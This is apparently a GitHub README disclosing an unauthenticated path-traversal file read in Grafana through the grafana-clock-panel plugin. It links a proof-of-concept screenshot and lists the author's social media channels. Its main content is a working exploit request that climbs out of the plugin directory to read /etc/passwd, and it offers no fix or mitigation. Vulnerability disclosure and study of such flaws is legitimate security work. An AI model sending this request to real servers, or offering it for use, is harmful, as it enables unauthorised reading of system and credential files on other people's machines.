# grafana-unauth-file-read

Unauthorized reading of files in Grafana (0day)

It looks like the new 0day LFI in Grafana exists thanks to the grafana-clock-panel plugin. It is enough to send a GET request of the form:

```GET /public/plugins/grafana-clock-panel/../../../../../../../etc/passwd```

### Proof
![PoC](https://raw.githubusercontent.com/Vulnmachines/grafana-unauth-file-read/main/Grafana.PNG)

### Follow us
### [Youtube](https://www.youtube.com/c/rapidsafeguard)
### [Twitter](https://www.twiiter.com/rapidsafeguard)
### [Telegram](https://t.me/rapidsafeguard)
### [Vulnmachines.com](https://www.vulnmachines.com)
### [LinkedIn](https://www.linkedin.com/in/punit-darji-5500/)
### [Business query](https://www.rapidsafeguard.com)
